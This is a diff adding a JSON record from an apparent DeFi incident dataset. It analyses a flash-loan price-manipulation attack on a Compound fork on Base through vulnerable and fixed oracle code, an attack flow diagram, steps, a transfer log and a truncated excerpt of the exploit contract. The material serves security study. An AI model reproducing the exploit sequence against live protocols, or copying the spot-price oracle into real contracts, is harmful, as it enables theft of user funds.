@@ -1,0 +1,49 @@
+{
+ "id": "2024__2024-10-26_CompoundFork_FlashloanAttack_Base",
+ "source_file": "2024/2024-10-26_CompoundFork_FlashloanAttack_Base.md",
+ "title": "Compound Fork (Base) — Flash Loan Price Manipulation Analysis",
+ "date": "2024-10-25",
+ "protocol": "Unknown Compound Fork",
+ "chain": "Base",
+ "loss_raw": "~$1,420,000 (estimated, combined across both attacks)",
+ "loss_usd": 1420000.0,
+ "root_cause": "Exploitation of oracle price dependency after manipulating Uniswap V3 spot price via flash loan",
+ "attack_tx": null,
+ "vulnerable_contract": null,
+ "classes": [
+  "flash-loan"
+ ],
+ "code_before": [
+  "// ❌ Vulnerable: directly uses Uniswap V3 spot price\n// Contract: 0x93D619623abc60A22Ee71a15dB62EedE3EF4dD5a\ncontract CompoundForkOracle {\n    // Queries the current spot price from the uSUI/WETH Uniswap V3 pool\n    function getUnderlyingPrice(address cToken) external returns (uint256) {\n        address underlying = IcToken(cToken).underlying();\n        uint8 decimals = IERC20(underlying).decimals();\n        \n        // ❌ Vulnerable point: uses sqrtPriceX96 from slot0() to compute spot price\n        // Can be manipulated within the same transaction via flash loan\n        (uint160 sqrtPriceX96,,,,,,) = IUniswapV3Pool(pool).slot0();\n        uint256 price = getPriceFromSqrt(sqrtPriceX96);\n        \n        // Decimal normalization\n        return price * (10 ** (18 - decimals));\n    }\n}",
+  "// ❌ Vulnerable: collateral value is evaluated with manipulated oracle immediately after enterMarkets()\ncontract Comptroller {\n    function getAccountLiquidity(address account) external returns (\n        uint256 liquidity,\n        uint256 shortfall\n    ) {\n        // Sum collateral value across each market\n        for (uint i = 0; i < markets[account].length; i++) {\n            address cToken = markets[account][i];\n            \n            // ❌ Vulnerable: manipulated oracle price is applied directly\n            uint256 price = oracle.getUnderlyingPrice(cToken);\n            uint256 balance = ICToken(cToken).balanceOf(account);\n            uint256 collateralFactor = markets[cToken].collateralFactorMantissa;\n            \n            liquidity += balance * price * collateralFactor / 1e36;\n        }\n    }\n}",
+  "┌─────────────────────────────────────────┐\n│  Attacker EOA                            │\n│  0x81d5187c...                          │\n└────────────────┬────────────────────────┘\n                 │ 1. Call start() / doTask()\n                 ▼\n┌─────────────────────────────────────────┐\n│  EXPLOIT_DO3 Contract                   │\n│  0x75628464...                          │\n└────────────────┬────────────────────────┘\n                 │ 2. flashLoan(WETH, 800e18)\n                 ▼\n┌─────────────────────────────────────────┐\n│  Morpho Blue Flash Loan Provider         │\n│  0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37.. │\n│  → Borrow 800 WETH                      │\n└────────────────┬────────────────────────┘\n                 │ 3. onMorphoFlashLoan() callback\n                 ▼\n┌─────────────────────────────────────────┐\n│  EXPLOIT_DO3: Flash loan callback exec  │\n│                                         │\n│  3a. enterMarkets([cSUI])               │\n│  3b. mint(cWETH, 15 WETH)              │\n│      → Deposit 15 WETH, receive cWETH   │\n│  3c. borrow(cSUI, 13,982 uSUI total)   │\n│      → Drain all uSUI from cSUI pool    │\n└────────────────┬────────────────────────┘\n                 │ 4. Transfer WETH(785) + uSUI(13,982) → Helper\n                 ▼\n┌─────────────────────────────────────────┐\n│  Helper Contract (executes d() function) │\n│                                         │\n│  4a. enterMarkets([this])               │\n│  4b. Uniswap V3: swap 500 WETH → uSUI  │\n│      uSUI price inflated tens of times  │\n└────────────────┬────────────────────────┘\n                 │ 5. Confirm oracle manipulation\n                 ▼\n┌─────────────────────────────────────────┐\n│  Vulnerable Oracle                      │\n│  0x93D619623abc60A22...                 │\n│                                         │\n│  getUnderlyingPrice(cSUI)               │\n│  → Returns Uniswap V3 slot0 spot price  │\n│  ❌ Manipulated price = ~tens of times  │\n│     the normal price                    │\n└────────────────┬────────────────────────┘\n                 │ 6. Drain all cWETH using manipulated collateral value\n                 ▼\n┌─────────────────────────────────────────┐\n│  Helper: borrow against inflated collat │\n│                                         │\n│  6a. mint(cSUI, 50 uSUI)               │\n│      → Collateral accepted at inflated  │\n│        manipulated price                │\n│  6b. getAccountLiquidity() → over-valued│\n│  6c. borrow(cWETH, 262.4 WETH total)  │\n│      → Drain entire cWETH pool liquidity│\n└────────────────┬────────────────────────┘\n                 │ 7. Swap remaining uSUI back to WETH\n                 ▼\n┌─────────────────────────────────────────┐\n│  Helper: uSUI liquidation swap          │\n│                                         │\n│  7a. Uniswap V3: all uSUI → 349 WETH   │\n│  7b. All WETH → sent to EXPLOIT_DO3    │\n│  7c. selfdestruct()                     │\n└────────────────┬────────────────────────┘\n                 │ 8. Repay 800 WETH flash loan\n                 ▼\n"
+ ],
+ "code_after": [
+  "// ✅ Fixed: uses TWAP (time-weighted average price) for manipulation resistance\ncontract CompoundForkOracleFixed {\n    uint32 public constant TWAP_PERIOD = 1800; // 30-minute TWAP\n\n    function getUnderlyingPrice(address cToken) external returns (uint256) {\n        address underlying = IcToken(cToken).underlying();\n        uint8 decimals = IERC20(underlying).decimals();\n        \n        // ✅ Fixed: uses observe() to query TWAP — cannot be manipulated within a single transaction\n        uint32[] memory secondsAgos = new uint32[](2);\n        secondsAgos[0] = TWAP_PERIOD; // 30 minutes ago\n        secondsAgos[1] = 0;           // current\n        \n        (int56[] memory tickCumulatives,) = IUniswapV3Pool(pool).observe(secondsAgos);\n        int56 tickCumulativesDelta = tickCumulatives[1] - tickCumulatives[0];\n        int24 timeWeightedAverageTick = int24(tickCumulativesDelta / int56(uint56(TWAP_PERIOD)));\n        \n        uint256 twapPrice = getPriceFromTick(timeWeightedAverageTick);\n        return twapPrice * (10 ** (18 - decimals));\n    }\n}",
+  "// ✅ Fixed: TWAP price calculation using OracleLibrary.consult()\nimport \"@uniswap/v3-periphery/contracts/libraries/OracleLibrary.sol\";\n\ncontract SafeCompoundForkOracle {\n    uint32 public constant TWAP_PERIOD = 1800; // 30-minute TWAP (minimum recommended)\n    \n    function getUnderlyingPrice(address cToken) external view returns (uint256) {\n        address underlying = IcToken(cToken).underlying();\n        address pool = getPool(underlying);\n        \n        // ✅ Uses 30-minute TWAP — cannot be manipulated within a single transaction\n        (int24 arithmeticMeanTick,) = OracleLibrary.consult(pool, TWAP_PERIOD);\n        uint256 twapPrice = OracleLibrary.getQuoteAtTick(\n            arithmeticMeanTick, 1e18, underlying, WETH\n        );\n        return twapPrice;\n    }\n}"
+ ],
+ "steps": [
+  "1. Call start() / doTask()",
+  "2. flashLoan(WETH, 800e18)",
+  "→ Borrow 800 WETH",
+  "3. onMorphoFlashLoan() callback",
+  "→ Deposit 15 WETH, receive cWETH",
+  "→ Drain all uSUI from cSUI pool",
+  "4. Transfer WETH(785) + uSUI(13,982) → Helper",
+  "4b. Uniswap V3: swap 500 WETH → uSUI",
+  "5. Confirm oracle manipulation",
+  "→ Returns Uniswap V3 slot0 spot price",
+  "6. Drain all cWETH using manipulated collateral value",
+  "→ Collateral accepted at inflated",
+  "6b. getAccountLiquidity() → over-valued",
+  "→ Drain entire cWETH pool liquidity",
+  "7. Swap remaining uSUI back to WETH",
+  "7a. Uniswap V3: all uSUI → 349 WETH",
+  "7b. All WETH → sent to EXPLOIT_DO3",
+  "8. Repay 800 WETH flash loan"
+ ],
+ "other_code": [
+  "// Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-10/CompoundFork_exploit.sol\n// Chain: Base | Block: 21,512,062 fork\n\ncontract EXPLOIT_DO3 {\n    function doTask() public payable {\n        // [Step 1] Request 800 WETH flash loan from Morpho\n        Flashable(MORPHO_BLUE).flashLoan(address(weth), 800 ether, \"\");\n        \n        // [Step 8] Transfer net profit WETH to caller (test contract)\n        weth.transfer(msg.sender, weth.balanceOf(address(this)));\n    }\n\n    function onMorphoFlashLoan(uint256, bytes calldata) external {\n        // [Step 2] Approve cWETH market\n        weth.approve(cWETH, type(uint256).max);\n        \n        // [Step 3] Register cSUI as collateral market in Comptroller\n        address[] memory s = new address[](1);\n        s[0] = cSUI;\n   ",
+  "1. FlashLoan  : Morpho → EXPLOIT_DO3 (800 WETH)\n2. Transfer   : WETH, EXPLOIT_DO3 → cWETH (15 WETH) — mint\n3. Transfer   : cWETH → EXPLOIT_DO3 (cWETH tokens 0 — sub-decimal)\n4. Transfer   : uSUI, cSUI → EXPLOIT_DO3 (13,982.87 uSUI) — borrow\n5. Transfer   : WETH, EXPLOIT_DO3 → Helper (785 WETH)\n6. Transfer   : uSUI, EXPLOIT_DO3 → Helper (13,982.87 uSUI)\n7. Transfer   : WETH, Helper → Uniswap V3 Pool (500 WETH) — price inflate\n8. Transfer   : uSUI, Uniswap V3 Pool → Helper (432,241 uSUI)\n9. Transfer   : uSUI, Helper → cSUI (50 uSUI) — mint collateral\n10. AccrueInterest: cWETH\n11. Transfer  : WETH, cWETH → Helper (262.44 WETH) — borrow ALL\n12. Transfer  : uSUI, Helper → Uniswap V3 Pool (remaining uSUI)\n13. Transfer  : WETH, Uniswap V3 Pool → Helper (349.33 WETH)\n14. Transfer  : WETH, Helper →"
+ ]
+}
